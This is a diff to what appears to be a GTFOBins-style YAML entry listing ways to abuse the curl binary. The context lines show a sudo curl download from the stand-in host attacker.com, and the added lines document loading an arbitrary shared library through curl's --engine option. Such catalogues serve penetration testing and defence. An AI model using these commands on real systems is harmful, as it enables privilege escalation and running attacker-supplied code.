@@ -36,4 +36,8 @@ functions:
         URL=http://attacker.com/file_to_get
         LFILE=file_to_save
         sudo curl $URL -o $LFILE
+  library-load:
+    - description: Load a shared library as OpenSSL engine. Only works if curl is compiled with OpenSSL and OpenSSL has engine support enabled.
+      code: |
+         curl --engine /path/to/library.so https://example.com
 ---
